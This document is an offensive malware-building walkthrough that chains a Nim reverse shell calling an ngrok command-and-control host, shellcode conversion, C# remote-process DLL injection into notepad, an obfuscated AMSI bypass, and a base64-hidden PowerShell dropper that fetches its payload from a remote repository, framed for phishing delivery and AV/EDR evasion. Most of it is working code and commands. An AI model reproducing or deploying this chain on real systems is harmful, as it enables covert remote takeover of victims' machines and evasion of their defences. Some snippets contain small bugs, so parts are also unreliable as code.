# The Killchain - An Adversarial Malware Design Walkthrough

# Requirements

- Windows 10 the assumption being that this walkthrough was developed using Windows 10 and Window's Subsytem for Linux - Debian for the purposes of compiling our malware.
- Python version 3
- Powershell no specific version is needed however we want to simulate general adversarial conditions so lets allow script execution.
- .NET Framework as long as you have the csc.exe utility for compiling C# applications you should be fine.
- Compiled Programming Language that can export applications as dynamic link libraries such as Go/C/C++/Nim
- sRDI: https://github.com/monoxgas/sRDI For generating position independent shellcode from malicious DLL
- Linux: The one TRUE operating system, any Linux distro will do, including Windows Subsystem for Linux (This is optional)
- Ngrok: https://ngrok.com/  For port forwarding traffic between devices (This is optional)
- Metasploit for generating malicious DLL's with msfvenom, I won't cover this but you can apply the same tradecraft (This is optional)
- Linux: The one TRUE operating system, any Linux distro will do, including Windows Subsystem for Linux (This is optional)

# Goals

The purpose of this adversarial malware design walkthrough is to explore techniques for designing a malware that will grant remote access
on a target while also bypassing attempting to bypass AV and EDR solutions. 
This specific walkthrough makes use of the Reflective DLL Injection technique with some minor obfuscation to execute our malware entirely in memory without writing the remote access dropper to disk. Here is a brief summary of the steps we need to take.
1. Design a simple remote access trojan that is not signatured by AV (Using this tradecraft you can substitute this for an advanced dropper)
2. Compile our trojan as a dynamic link library so that we can use it as a modular component with other malware.
3. Modularizing our trojan for reflective dll execution.
4. Deliver a malicious file to the target that will excute our malware in memory so that this file will be the only artifact on disk for forensics.

# Step 1: Designing the Trojan

For the sake of brevity our trojan in this example will be a simple reverse shell created using Nim, keep in mind that the trojan in question need not be a reverse shell nor does your trojan need to be written in Nim. I am using Nim because this is a simple proof of concept
trojan.  Nim is capable of compiling to C/C++/Objective C and even Javascript. You can also compile a Nim program for multiple different operating systems depending on the flags you pass to the compiler, however that is beyond the scope of this walkthrough. Lets take a look at our script reverse_shell.nim:

```
import net
import osproc   # For execCmdEx
import os


# My CC Server IP and Port
var ip = "2.tcp.ngrok.io"
var port = 11606

# Create a new socket
var socket = newSocket()
var finalCommand : string
while true:
    try:
        socket.connect(ip, Port(port)) # Connect to CC Server
        # On a successful connection receive command from CC Server, execute command and send back result
        while true:
            try:
                socket.send("agent-x >")
                var command = socket.recvLine() # Read server command to be executed on target
                if command == "exit":
                    socket.send("Ending session for this client.")
                    socket.close()
                    system.quit(0)
                if system.hostOS == "windows":
                    finalCommand = "cmd /C" & command
                else:
                    finalCommand = "/bin/sh -c " & command
                var (cmdRes, _) = execCmdEx(finalCommand) # Executes final command and saves the result in cmdRes
                socket.send(cmdRes) # Send back the result to the CC Server
            except:
                socket.close()
                system.quit(0)
    except:
        echo "Connection failed, retrying in 5 seconds..."
        sleep(5000) # Waits 5 seconds
        continue

```
Notice that this implementation simply uses the standard socket library and assumes that you are forwarding the traffic through ngrok.
Everytime you start the Ngrok service you will have a different IP address and Port, you will need to update this in your own implementation.
The interesting thing is not necessarily this particularly reverse_shell, but rather how we will execute it on our target device. 
Remember that we are going to be executing this trojan entirely in memory, hopefully without a target noticing.

# Step 2: Compiling the Trojan as a Dynamic Link Library

Let's compile this script on our Window's machine with the following compiler flags:

```
nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release --hints:off --warnings:off -d:danger --app:lib -d:strip --opt:size --passc=-flto --passl=-flto c reverse_shell.nim
```
The reason why we are passing so many flags are to specify the compiler to use as well as to optimize the filesize of our Nim trojan. In this example the flags of most note are --app:lib (This instructs the compiler to generate a DLL file instead of an executable), --opt:size (This instructs the compiler to optimize size) -d:danger (Only use this flag if you are certain your application works)
Remember under the hood the Nim compiler is translating your script into C and then generating a DLL from the intermediary C code. Once we have our reverse_shell.dll you may be surprised to see that the resulting binary is surprisingly small considering the fact that we have written this code in a language with a dynamic syntax, only about 300 kilobytes! This means that on the target our malware will have a very
small memory footprint. If we were to use a Go based reverse shell the memory footprint would be much larger because all Go binaries contain
the entire Go runtime.  There are advantages to using Go however, because of the size of the binaries it is much more time consuming to analyze a Go based malware, forensics teams would need to sift through the Go runtime code as well as many benign libraries in order to identify the malicious code. It is also this very fact that makes it difficult to write signatures for Go malware as opposed to C based malware.
Now that we have our trojan ready to go lets fire up our command and control center, which in this example will simply consist of ngrok and netcat.
If you have ngrok installed please run the following command to start the service:

```
ngrok tcp 4444
```
This instructs ngrok to forward all traffic to port 4444 on your local machine. You can alternatively specify a different device's IP and Port on your local network if you would prefer.
Because this is a reverse shell using standard tcp, we will need a listener such as netcat, fire it up with the following command:

```
nc -nlvp 4444
```

# Step 3: Modularizing our Trojan
Now that we have a dynamic link library and our c2 server setup in the background, lets convert our malware into a module so that we can reflectively inject it at runtime. For a general understanding of how reflective dll injection works please take a look at [this](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection). There are many advanced techniques for executing this technique but let's reason about the end to end process we will achieve to get our trojan to execute in memory. First we want to deploy a malicious file to the target that will start a powershell process.  The powershell process will then remotely load a C# based binary assembly into memory and use reflection to execute the C# assembly. The C# assembly will handle actually retrieving our reverse_shell.dll remotely and activating it in memory. In order for that last step to happen, our dll has to be accessible to our C# application as a compatible byte array. After our C# application has this byte array format of our reverse_shell.dll we will execute the byte array using system calls. To convert our dll into a usable byte array format for C# we can use the sRDI library, clone it from the github repo:

```
git clone https://github.com/monoxgas/sRDI
```

After you have the repository cloned, navigate to the Python directory and copy over your reverse_shell.dll file into that same directory.
Next run the following command to generate a reverse_shell.bin file:

```
python ConvertToShellcode.py reverse_shell.dll
```

So why are we taking this step you ask? Well although we have a dll file if we are going to execute our malicious dll in memory using system calls, we need to have it in the format of position independent shellcode, that is exactly what the sRDI library does for us. Now that we have this binary format of our dll, we can convert it into a byte array format usable in C# by running the following command:

```
hexdump -v -e '1/1 "0x%02x,"' reverse_shell.bin | sed 's/.$//' > reverse_shell.txt
```

Now that we have a shellcode version of our trojan payload you can see that it is very simple to modularize our payloads by following the above process. 
Keep in mind this shellcode has not been obfuscated at all, and at least for now we don't need to since Nim binaries are as of now not usually flagged by antivirus solutions.  
You should also keep in mind that the shellcode format generated in our reverse_shell.txt file is also usable in other languages such as Go. 
One last thing I would like to point out is that we have a great opportunity here to utilize some devops practices, this entire workflow is perfect for a CI/CD pipeline.
Before we continue I would like to breifly discuss what we need to do next to acheive shellcode execution and what is happening under the hood.
In order for us to execute our reverse_shell.dll at runtime we will need to make use of system calls (syscalls).
By utilizing certain Windows APIs we can instruct the operating system to allocate memory for us, marshall our shellcode into that memory space and subsuquently execute said shellcode.
It is important to realize that during this process our program surrender's control to the shellcode that has been placed in memory, which means that at while executing these low level operating system calls it is not easy for the encapsulating program to catch errors.
If you incorrectly implemented something in your shellcode or if you are marshalling data back and forth between your shellcode and your encapsulating program incorrectly, things may silently fail.
The way we will allocate memory for our shellcode in this example is by using the APIs exposed within the kernel32.dll which exists on all windows machines.
The APIs exported by the kernel32.dll will subsuquently call APIs within the ntdll.dll.
The ntdll.dll sits on the edge of both the user and kernel space. In the past AV and EDR solutions would hook into the kernel32.dll and inspect function calls located in that library, and you could bypass it by directly calling the ntdll.dll library, however this is not the case anymore. Now AV and EDR solutions will also hook the ntdll.dll library as well to observe any suspicious calls here as well.
With sufficient obfuscation however we should be able to avoid getting flagged by AV and EDR products.
In our C# application we will retrieve our shellcode as a byte array and execute a syscall to execute our payload as observed in Injection.cs example:

```c#
    public static byte[] maliciousDll = GetMaliciousDll("https://github.com/bakarilevy/killchain/reverse_shell.dll");

    public static byte[] GetMaliciousDll(string url) {
        using (var client = new HttpClient())
        using (HttpResponseMessage response = await client.GetAsync(url))
        {
            byte[] maliciousDll = await response.Content.ReadAsByteArrayAsync();
        }
        return maliousDll;
    }

```

In this snippet we can see that our C# application is able to remotely load our Nim DLL into memory from a remote repository, this can of
of course be changed very easily so that we can host our reverse shell on another platform.

```c#
    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
``` 

In this snippet you can see that we are exporting the necessary functions from the kernel32.dll to carry out the DLL Injection.
We are using .NET platform's Platform Invoke (P/Invoke) in order to call what can be referred to as unmanaged code.
The code that we write in C# is converted into an intermediate bytecode and consumed by the .NET Common Language Runtime.
You will see later why we choose to utilize this method for loading our trojan malware into memory.

```c#
public enum ProcessAccessRights
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    public enum MemAllocation
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x1000000,
        SecCommit = 0x08000000
    }

    public enum MemProtect
    {
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
    }
```

Here we are specifying the numerous flags we may require for invoking the APIs in the kernel32.dll. We can use these flags to do things such as setting the permissions on the memory segments that we allocate.

```c#
    public static int SearchForTargetID(string process)
    {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                {
                    pid = proc.Id;
                    Console.WriteLine("[+] Target process ID found: " + pid);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[+] " + Marshal.GetExceptionCode());
            Console.WriteLine(ex.Message);
        }
        return pid;
    }
```
We can see that this function is used to identify the process id for a specific program we will attempt to inject our shellcode into.
It is very important to remember that we can only inject our shellcode into a process we have the correct permissions for.

```c#
    public static void ReflectiveDLLInject(int targetId, byte[] buffer)
        {
            try
            {
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;


                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
                Console.WriteLine("[+] Getting the handle for the target process: " + procHandle);
                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("[+] Allocating memory in the remote process " + remoteAddr);
                Console.WriteLine("[+] Writing shellcode at the allocated memory location.");
                if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                {
                    Console.WriteLine("[+] Shellcode written in the remote process.");
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                }
                else
                {
                    Console.WriteLine("[+] Failed to inject shellcode.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
```
In our ReflectiveDLLInject function is where the actual shellcode injection happens, you can see that we are calling the unmanaged functions that are located in the kernel32.dll.
This is a place where you can do further experimentation, such as changing the permission flags you pass for the memory protections, such as MemProtect.PAGE_EXECUTE_READWRITE.

```c#
public static void Main(string[] args) {

        Console.WriteLine("Executing Reflective Dll Injection...");
        string targetProccess = "notepad";
        int targetProccessId = SearchForTargetID(targetProccess);
        ReflectiveDLLInject(targetProccessId, maliciousDll);
        
    }
```

Of course in our Main function, we simply attempt to identify a running notepad process and inject it. We could alternatively attempt to spawn a process manually using .NET and inject into it however, that may not be as stealthy as injecting into an already running process.

When researching this technique you may wonder why we are using the VirtualAllocEx WindowsAPI function instead of the VirtualAlloc function.
We use VirtualAllocEx because we are allocating memory in another process' address space, if we were not doing this we could use VirtualAlloc.

We can compile this C# program into a .NET assembly using the following command:

```
csc.exe /out:Injection.exe Injection.cs 
```

Now that we have a C# .NET binary that will load our trojan into memory, you may wonder how we will deliver it to our target.
It's not like you could easily convince an end user to click on an unsigned binary in your phishing campaign.
Well it's simple, we will use Powershell to execute our .NET binary, if you recall earlier I mentioned that .NET applications are compiled into bytecode that is consumed by the .NET Common Language Runtime, well Powershell is simply a thin layer over .NET's System.Management.Automation API, which means that it can also consume .NET bytecode (referred to as .NET Assemblies) and execute them in memory!

The process for doing this is very simple and works with any .NET Assembly:

```ps1
$path = "C:\path\to\my\assembly\MyProgram.exe"
$bytes = [System.IO.File]::ReadAllBytes($path)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ($null)))
```

In the above example you can see that directly within powershell we can load our .NET assembly here named "MyProgram.exe"
We then read the bytes of the assembly and load it into memory, then we use .NET's reflection API to call the Main method of our .NET application.
Of course keep in mind that you can compile your .NET application as a DLL as well but do not get confused, you can still use this same Powershell script to execute the .NET DLL in the exact same way.
It's important that you do not get confused between .NET managed and unmanaged code. Managed code would be considered any code that compiles to .NET assembly byte code, the reverse_shell that we developed in Nim is NOT managed code from the .NET runtime perspective, that is why we must use the .NET P/Invoke APIs in the kernel32.dll to call the unmanaged code that we developed in Nim.
Don't get confused by the dlls you can generate using .NET and those you can generate using natively compiled languages.

We will again execute a web request from our Powershell script to load our Injection.exe application into memory from a static repository and reflectively execute it on our target machine.
As you can begin to see, one mistake made on behalf of the user can lead to a very serious and stealthy malware executing in the background.
One more precaution we can take to increase the chances of our malware establishing a foothold on the target is to first attempt to patch AMSI before we even attempt to load our any of our more sophisticated malware on the target.

If you are unfamiliar, Microsoft's Anti Malware Scan Interface (AMSI) is a protection mechanism added to assist in the detection of malware, you can read more about it [here](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). AMSI also exposes hooks so that AV and EDR solutions can make use of it to augmuent their functionality.
In this example we will make use of Matt Graeber's ever popular AMSI Initalization Fail to patch AMSI out of the running Powershell process before we retrieve our malware.
This leaves us with the final version of our Dropper.ps1:

```ps1
$k = $("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result);
$w = $("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result).Substring(9,14);
[Ref].Assembly.GetType('System.Management.Automation.' + $k).GetField($w, 'NonPublic,Static').SetValue($null, $true);
$path = (Invoke-WebRequest 'https://github.com/bakarilevy/killchain/Injection.exe').Content;
$bytes = [System.IO.File]::ReadAllBytes($path);
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ($null)));
```

The astute amongst you will notice that this is not an acceptable script to deploy to our target because it contains data about where some of our artifacts are stored.
Luckily we can make this dropper more stealthy by base64 encoding it before we deliver it to our target have a look at Stealth.ps1:

```ps1
$k = "JGsgPSAkKCI0MSA2RCA3MyA2OSA1NSA3NCA2OSA2QyA3MyIuU3BsaXQoIiAiKXxmb3JFYWNoe1tjaGFy..."
$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($k))
echo $w -nop -windowstyle hidden -
``` 

Please note that I have not included the entire base64 string in the above example due to it's size however it is in the source code.
As you can see we have taken our Dropper.ps1 script and obfuscated it as a string, we will then unpack it at runtime and execute it.
The final step in our killchain is simply to generate a malicious file that will retrieve and execute our Stealth.ps1 script in memory.

# Resources
- https://github.com/byt3bl33d3r/OffensiveNim - Excellent Proof Of Concept scripts for Nim based malware
- https://inv.riverside.rocks/watch?v=gH9qyHVc9-M - Excellent explanation of several techniques for executing Shellcode using Go
- https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/ - An excellent explanation of how AMSI works and common bypasses
- https://github.com/stephenfewer/ReflectiveDLLInjection - Author of the Reflective DLL Injection technique
- https://www.pinvoke.net/index.aspx - Handy reference of .NET P/Invoke function signatures
- https://github.com/r3nhat/XORedReflectiveDLL - Template of our Injection.cs class, slightly modified for our use cases